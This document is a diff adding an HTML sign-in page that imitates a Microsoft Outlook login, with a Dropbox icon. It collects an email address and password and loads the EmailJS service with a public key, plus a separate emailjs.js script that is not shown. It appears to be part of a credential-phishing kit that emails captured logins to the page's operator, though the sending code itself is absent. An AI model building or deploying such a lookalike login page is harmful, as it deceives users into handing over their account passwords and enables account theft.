@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>sign in</title>
+    <link rel="shortcut icon" href="266593_dropbox_icon.png" type="image/x-icon">
+    <link rel="stylesheet" href="./login.css">
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script type="text/javascript">
+  (function () {
+    emailjs.init("DXxadXNVYQdhrtPMW");
+  })();
+</script>
+
+</head>
+<body>
+    
+    <div class="zhico">
+      <form id="login-form">
+         <div class="label" onclick="window.location.href = 'index.html'">
+            <i onclick="window.location.href = 'index.html'" class="fa-solid fa-arrow-left-long"></i> &nbsp; back
+         </div>
+        <div align="center">
+         <img width="70px" height="70px" src="./Microsoft_Outlook_logo_svg_free_download_-_Brandlogos_net-removebg-preview.png" alt="">
+        </div>
+           <h3 align="center" class="h3">Login with your Outlook</h3>
+           <br>
+         <div class="label">
+            <label  for="Email address">Email address</label><br>
+            <input type="email" id="email" placeholder="Your Email" required>
+         </div>
+         <br><br>
+         <div class="label"> 
+            <label  for="Email address">Password</label><br>
+            <div id="position" class="form-group">
+
+               <input type="password" id="password" name="password" required placeholder="Password">
+               <span style="background-color: white;" id="eye">
+                   <i class="fa-solid fa-eye-slash" id="eyeClose"></i>
+               </span>
+           </div>
+         </div><br><br>
+         <div class="label">
+            <button type="submit" class="btn">Continue</button>
+         </div>
+       </form>
+    </div>
+    <script src="./emailjs.js"></script>
+    <script
+    src="https://kit.fontawesome.com/7dbb2c7d34.js"
+    crossorigin="anonymous"
+  ></script>
+</body>
+</html>
